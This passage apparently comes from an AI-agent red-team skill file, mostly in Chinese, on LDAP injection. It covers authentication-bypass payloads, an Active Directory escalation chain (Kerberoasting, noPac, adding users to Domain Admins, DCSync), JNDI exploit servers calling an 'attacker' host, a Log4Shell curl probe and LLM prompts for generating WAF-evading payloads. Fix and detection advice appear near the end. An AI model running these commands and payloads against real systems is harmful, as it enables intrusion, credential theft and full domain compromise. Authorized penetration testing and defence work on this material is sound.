const filter = `(&(uid=${username})(userPassword=${password}))`;   // 洞
const filter2 = new ldapjs.AndFilter({filters:[
  new ldapjs.EqualityFilter({attribute:'uid', value:username}),    // 安全
  ...]});

# Spring LDAP直拼（漏洞形态）：
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";  // 洞
# 正确：ldapTemplate.authenticate(Dn, Filter.encodeEquality("uid", username), ...)
# 或 LdapEncoder.filterEncode(username) 后再拼接
```

### 8.3 快速定位LDAP拼接漏洞的审计模式
```
# ① 检索危险API调用点（grep模式，跨语言通用）：
"ldapTemplate.search|search(" + "userFilter|baseDn"
"(sAMAccountName|uid|cn|mail|userPrincipalName|distinguishedName)(=|+|\")"
"ldap_escape|escape_filter_chars|LdapEncoder|EscapeFilter"  ← 看转义是否覆盖所有输入位
# ② 追踪输入流：HTTP参数 → service层 → LDAP工具类
# ③ 高发位置清单：登录、密码重置、搜索、成员检查、SSO userProfile加载、审计查询
# ④ 静态扫描工具：Semgrep规则(ldap-injection)、CodeQL(ql/java/query/...LDAP)
```

## 九、LDAP注入 → AD域渗透攻击链联动

### 9.1 注入 → 信息泄露 → 域枚举（BloodHound数据源）
```
# 通过注入获得的读权限可批量导出域图数据 → 灌入BloodHound找提权路径
windapsearch.py -d corp.local -u USER -p PASS --users --groups --da
ldapdomaindump -u corp.local\\USER -p PASS dc.corp.local -o ./dump
python3 bloodhound-python -u USER -p PASS -d corp.local -c All -ns DC_IP
# 注入点获得的"查询能力"完全等价于这些工具的LDAP查询 → 攻击面共享
```

### 9.2 注入 → 凭据获取 → Kerberoasting/AS-REP
```
# 注入拿到读权限后：
# Kerberoasting（SPN账户的TGS票据离线爆破）：
GetUserSPNs.py corp.local/USER:PASS -dc-ip DC -request
# AS-REP Roasting（无预认证账户）：
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC -no-pass
# 结合盲注提取的哈希/属性 → 离线破解（hashcat -m 13100/18200）
# gMSA提取（CVE-2026-58222面）：若能读取msKds-RootKeyData → gMSADump离线推导
```

### 9.3 注入 → 写操作 → 提权（改属性/加组/重置密码/sAMAccountName伪造）
```
# 若应用用注入点后的绑定身份执行Modify（高权限服务账号）：
# ① 改组成员：把普通用户加入Domain Admins
ldapmodify -x -D "cn=srv,dc=corp,dc=local" -w pass <<'EOF'
dn: CN=alice,CN=Users,DC=corp,DC=local
changetype: modify
add: memberOf
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
EOF
# ② 重置密码（需允许改unicodePwd）
# ③ 设置SPN → 制造Kerberoast目标 / 修改msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD
# ④ noPac（CVE-2021-42278/42287）：通过LDAP把机器账户sAMAccountName改成DC名（去$后缀）
python3 noPac.py corp.local/USER:PASS -dc-ip DC -dc-host DC -shell
#     → Kerberos TGT冒用DC身份 → S4U2self → DCSync → 域管（已被广泛武器化，2026仍活跃于未修补环境）
```

### 9.4 完整攻击链案例（低权限 → 域管）
```
1. 登录接口存在过滤器注入（CVE-2026-42568式通配符）→ 用默认口令/已知口令接管低权用户 alice
2. 通过alice的LDAP读权限枚举：发现服务账户 svc_report 设置SPN且密码永不过期
3. Kerberoasting 获取 svc_report 的TGS → 离线破解出明文密码
4. svc_report 具有写权限（或注入点绑定的服务账号有写权限）：
   - 方案A：RBCD —— 为攻击者控制的机器账户设置 msDS-AllowedToActOnBehalfOfOtherIdentity → 以svc身份申请域管服务票据
   - 方案B：noPac —— 借写权限创建机器账户并改sAMAccountName为DC名 → DCSync
5. DCSync 导出 krbtgt/域管哈希 → 完全控制域
关键教训：注入 → 只是入口；链路价值在于后续每一步都要用LDAP查询/写入能力串起来
```

### 9.5 LDAP服务器自身漏洞面
```
# CVE-2026-58222 Samba AD DC（见3.5）：Compare属性名注入 → msKds-RootKeyData → gMSA → 域沦陷
# CVE-2026-11770 389 DS：预认证CleanAllRUV扩展操作过滤器注入 → 读cn=config复制bind DN/密码存储方案
#   检测：向389 DS发送CleanAllRUV状态检查扩展请求注入过滤器，观察布尔返回差异
# CVE-2021-42278/42287（noPac）、CVE-2020-1472（Zerologon，经LDAP改机器账户密码面）
# 建议：先测注入，再测目录服务自身已知CVE，两者可叠加
```

## 十、AI大模型结合的LDAP攻防（v3.0新增维度）

### 10.1 AI辅助生成Payload变体与盲注脚本
```
# 用法1：让LLM基于"原始过滤器模板+已知可注入位"批量生成变体（对抗WAF特征）
提示词示例：
  "目标过滤器是 (&(uid={USER})(userPassword={PASS}))，已知可注入。
   请生成20个不包含字面量'*)(|(objectClass=*))'的等价恒真认证绕过payload，
   覆盖：双重否定、逻辑重构、>=替代、属性名注入、Unicode/Hex编码形态。"

# 用法2：让LLM把5.5节盲注脚本参数化/适配目标（正负特征、属性、字符集、代理）
# 用法3：让LLM审计输出（见10.2）闭环——生成→验证→按响应特征反馈给LLM迭代
# 注意：AI生成payload必须人工校验过滤器语法（AI常产出非法括号），在授权靶场验证后使用
```

### 10.2 LLM审计LDAP查询拼接代码
```
# 提示词模板（代码审计场景）：
  "以下是某应用的LDAP查询代码。请以红队视角审计：
   1) 哪些用户输入进入了过滤器/DN/基DN？
   2) 是否使用了正确的转义函数（过滤器用RFC 4515、DN用RFC 4514）？
   3) 转义是否覆盖属性名、结构位？
   4) 有无绕过框架转义API的裸字符串拼接？
   5) 给出可复现的PoC注入payload。"
# 效率：LLM可秒级扫出"拼串+缺转义"模式，人工复核高危位（登录/搜索/成员检查）
# 结合8.3的静态扫描定位输入点，再用LLM做深层次语义审计（如OID注入、DN逃逸）
```

### 10.3 大模型/SSO/Agent平台的LDAP攻击面（2025-2026热点）
```
# ① AI Agent = 新身份载体：OWASP Agentic Top 10（2025-12发布）已将"身份/权限"列为高危面
#    Agent若复用LDAP服务账号凭据（ambient authority）→ 注入/被盗=服务账号全权限
# ② RAG/企业AI搜索的ACL过滤：文档权限若经LDAP查询（(owner=USER)(acl=GROUP)）实现
#    → LDAP注入可直接让LLM上下文越权（检索到无权文档 → 提示词注入泄露）
# ③ SSO平台（Keycloak/CAS/PAC4J系/Okta）的LDAP联邦：
#    - PAC4J注入(CVE-2026-40459)可伪造SSO身份
#    - 登录代理的ID映射查询（(employeeID=ID)）是高频注入点
# ④ AI辅助攻击面：威胁者用AI Agent自动化AD侦察（2026-06 Sophos披露Cursor+Claude
#    Opus驱动AD侦察与EDR规避流水线）→ 防御方需假设对手已有AI加速
# 测试要点：对Agent平台的身份映射、ACL过滤、SSO回调中所有LDAP参数做注入测试
```

## 十一、工具链

### 11.1 枚举与探测
```bash
# ldapsearch（OpenLDAP客户端，最常用）
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://target -D "cn=admin,dc=corp,dc=local" -w pass -b "dc=corp,dc=local" "(uid=*)"
ldapsearch -x -H ldaps://dc.corp.local -b "dc=corp,dc=local" "(servicePrincipalName=*)" \
  servicePrincipalName msDS-AllowedToDelegateTo
# 匿名绑定探测
ldapsearch -x -H ldap://target -s base -b "" namingContexts

# Nmap NSE
nmap -p 389,636,3268,3269 --script ldap-search,ldap-rootdse,ldap-brute target

# AD枚举全家桶
enum4linux-ng -A target
windapsearch.py -d corp.local -u u -p p --users --da --groups
ldapdomaindump -u 'corp.local\user' -p pass dc.corp.local -o ./dump
bloodhound-python -u user -p pass -d corp.local -c All -ns 10.10.10.10
```

### 11.2 自动化利用
```bash
# 盲注/爆破
ldap-blind-explorer（老牌盲注器）
# 域渗透联动
noPac.py / sam-the-admin（CVE-2021-42278/42287）
impacket 全家桶：GetNPUsers.py GetUserSPNs.py addcomputer.py renameMachine.py
ntlmrelayx.py（Relay to LDAP：--delegate-access / --escalate-user）
kerbrute（口令喷洒/Kerberoast验证）
hashcat -m 13100/18200（TGS/ASREP破解）
```

### 11.3 JNDI/LDAP RCE相关
```bash
# 恶意LDAP服务器搭建
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit" 1389
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8888/#Exploit" 1099
java -jar rogue-jndi.jar -n "ldap://attacker:1389" -c "calc.exe"
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "cmd" -A attacker
# Log4Shell探测（无回显验证）
curl -X POST http://target/ -H "User-Agent: \${jndi:ldap://x.dnslog.cn/a}" -d "x=1"
# dnslog/interact.sh 观察LDAP/DNS回连
```

### 11.4 命令速查（红队实战备忘）
```bash
# 常用属性请求清单
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" \
  "(sAMAccountName=*)" sAMAccountName userPrincipalName description info \
  memberOf servicePrincipalName userAccountControl whenCreated lastLogonTimestamp

# 盲注原始请求（Burp Repeater模板）
POST /login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=admin)(&(userPassword=M*&password=x

# 通配符横向接管（见3.3）
# 框架转义复核（见8.1表）
# 域渗透联动（见第九章）
```

## 十二、测试检查清单

### 12.1 信息收集与攻击面
- [ ] 确认后端使用LDAP目录（错误信息/端口指纹/依赖扫描）
- [ ] 绘制全部LDAP数据流入口（登录/搜索/找回/SSO/MFA/权限检查/设备注册/RAG ACL）
- [ ] 识别目录类型：Active Directory / OpenLDAP / FreeIPA / 389 DS / ADAM(LDS)
- [ ] 网络面：389/636/3268/3269 是否可达，匿名绑定是否允许
- [ ] 确认应用绑定账号权限（只读/写/管理员）——决定攻击链上限
- [ ] 检查LDAP签名/通道绑定是否启用（影响中继类攻击可行性）

### 12.2 注入验证与认证绕过
- [ ] 元字符注入探测：`* ( ) \ %00` 逐一提交观察差异
- [ ] 经典永真绕过：`*`、`*)(|(uid=*))`、`admin)(&))`、双字段配合
- [ ] AND/OR/NOT逻辑注入（OR短路/双重否定/假条件分支）
- [ ] 通配符滥用横向接管（已知口令 + `username=*` 前缀梯度）
- [ ] RDN/基DN注入与分区逃逸
- [ ] 空字节截断（老系统）
- [ ] LDAP URL参数注入（filter/base DN/scope段）
- [ ] JNDI注入点排查（lookup/Log4j ${jndi:}）

### 12.3 信息枚举
- [ ] 通配符枚举用户/组/对象
- [ ] 属性字典探测（*)(ATTR=*)）与非标准属性（description/info/extensionAttribute）
- [ ] AD专属：SPN/域管递归成员/禁用账户/委派属性（见4.3）
- [ ] 敏感属性：userPassword/unicodePwd存在性/msKds-RootKeyData可读性
- [ ] 密码爆破/喷洒（授权范围与锁定策略评估后）

### 12.4 盲注数据提取
- [ ] 正负响应识别与注入确认
- [ ] 逐字符prefix盲注
- [ ] 二分法优化（>=排序比较）
- [ ] 位运算字节提取（OID 2.5.13.18，见5.3）
- [ ] OAST/OOB验证（无回显场景）
- [ ] 脚本自动化（5.5节模板参数化）

### 12.5 绕过与链路
- [ ] WAF/过滤绕过：编码/语法混淆/语义重构/传输层
- [ ] 框架转义缺陷复核（python-ldap CVE-2025-61911形态等）
- [ ] LDAP注入→域枚举→Kerberoasting/AS-REP→提权链路（见第九章）
- [ ] 写操作提权（改组成员/RBCD/noPac）评估
- [ ] 目录服务自身CVE（Samba 389 DS noPac Zerologon）

## 十三、修复建议

### 13.1 代码层面（根治）
- **杜绝字符串拼接**：使用框架参数化API（Spring `AndFilter/EqualsFilter`、ldapjs过滤器类、`ldapTemplate.authenticate(Dn, filter)`）
- **正确转义**：过滤器值用RFC 4515转义（`\2a \28 \29 \5c \00`），DN组分用RFC 4514转义（`+ ; < > \ # " , =`），两者不可混用
- **属性名/结构位白名单**：属性名、基DN等结构位禁止由用户输入决定，用枚举白名单
- **输入校验**：用户名白名单（字母数字+`@.-_`），长度限制（防超长DoS）
- **错误信息收敛**：不返回LDAP错误详情/过滤器语法信息
- **认证与搜索分离**：优先使用Bind认证而非"搜索+比较"式过滤器认证；Bind的DN由服务器端映射

### 13.2 加固与依赖
- **升级修复库**：python-ldap ≥3.4.5（CVE-2025-61911）、PAC4J ≥4.5.10/5.7.10/6.4.1（CVE-2026-40459）、Yamcs ≥5.12.7（CVE-2026-42568）、OpenAM ≥16.1.1（CVE-2026-46619）、Samba（CVE-2026-58222）、389 DS（CVE-2026-11770）
- **最小权限绑定**：应用绑定账号仅授所需读写权限，禁止管理员绑定；服务账号独立，杜绝共享凭据
- **禁用匿名绑定**：rootDSE以外全部要求认证
- **启用LDAPS并校验证书链**：拒绝自签/无效证书；强制StartTLS（禁止降级）
- **AD加固**：启用LDAP签名（Require signing）+ 通道绑定（`LdapEnforceChannelBinding=2`），参考ADV190023
- **防护NTLM Relay**：启用EPA/CBT、SMB签名、清除LLMNR/NBNS
- **敏感属性ACL**：限制userPassword/unicodePwd/msKds-RootKeyData/description读取

### 13.3 监控检测
- **LDAP审计日志**：监控异常过滤器（含`*`、`|`、`(`的登录过滤器）、批量枚举、异常Compare/Modify
- **WAF规则**：拦截过滤器元字符的登录/搜索参数；对`(&(|`、`objectClass=*`、`userPassword=*`特征告警
- **告警关联**：同一来源大量登录尝试+不同username → 通配符接管/盲注行为
- **AI/Agent平台**：对Agent的LDAP查询做同等级审计与最小化授权（OWASP Agentic Top 10）

## 十四、注意事项

- **仅限授权测试/合规声明**：本技能所有技术、Payload与脚本**仅供获得明确书面授权的渗透测试、红队演练、CTF与安全研究使用**。未经授权对任何LDAP目录（尤其存储企业身份凭证的Active Directory/OpenLDAP）进行测试均属违法行为。在中国大陆开展测试须遵守《中华人民共和国网络安全法》《数据安全法》《个人信息保护法》及《刑法》第285/286条相关规定；域环境测试可能触发锁定策略与告警，务必先与甲方确认范围、时限与止损预案。
- **最小影响原则**：优先使用无害探测（`*`存在性、dnslog回连）确认漏洞，再进行数据提取；盲注与爆破会产生大量LDAP查询日志，注意节奏与频率
- **数据保护**：不读取/导出生产环境真实凭据哈希（userPassword等）；验证用最小化样本
- **域环境高风险**：Modify类操作（改组成员/重置密码/加机器账户）会留下不可逆痕迹，测试前确认回滚方案；noPac/Zerologon类攻击可能影响域控制器稳定性
- **目录DoS风险**：超长过滤器、`(attr=*)`全量枚举在大型AD上会消耗DC资源，注意sizeLimit与分页
- **清理痕迹**：测试结束后删除添加的账户/修改的属性/产生的票据与缓存
- **情报时效**：本技能2026-08更新；LDAP注入面持续演进（AI Agent身份、gMSA、目录服务CVE），测试前查阅最新公告与厂商补丁

## DECISION TREE

```
LDAP 注入点确认（登录表单/搜索框/过滤参数进入 filter）？
├── 认证绕过（登录面）→ 元字符闭合数递推还原 filter 模板 → *)(& 通配 / 精确 admin)(& 旁路
├── 信息提取（搜索面）→ 通配符枚举 → 属性名上下文注入 OID 扩展（1.3/2.5 系列）
├── 盲注（无回显）→ 布尔差分 → 二分/位运算 OID 高效提取（5.3）
├── 过滤器被转义 → RDN/过滤器混淆、编码差异（WAF 绕过章）
├── LDAPS/通道绑定 → TLS 层与 NTLM Relay 联动面
├── 拿到目录读取权 → 域枚举 → Kerberoasting/noPAC/gMSA（联动 active-directory-attack）
└── JNDI 注入点共存 → jndi-injection 细分包承接 RCE 落地
```

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for baseline/probe comparison, `nuclei` only with a narrowly selected relevant template, and `execute-python-script` for controlled boolean-differential extraction when necessary. Do not assume a repeater or API-fuzzer MCP exists.

## RELATED ROUTING

- [authentication-bypass](../authbypass-authentication-flaws/SKILL.md) — LDAP auth bypass (`*)(&`) is a direct authentication flaw
- [sqli](../sqli-sql-injection/SKILL.md) — SQL injection shares analogous injection methodology; boolean-blind extraction transfers
- [xpath-injection](../xpath-injection-testing/SKILL.md) — XPath injection shares query-construction abuse patterns
- [xxe](../xxe-xml-external-entity/SKILL.md) — XML-related attacks can target LDAP backends via external entity injection
- [jndi-injection](../jndi-injection/SKILL.md) — LDAP→JNDI 远程类加载是注入后 RCE 的常见落地链
- [active-directory-attack](../active-directory-attack/SKILL.md) — 注入取得目录读取权后，域枚举/Kerberoasting/委派滥用由该 Skill 接管
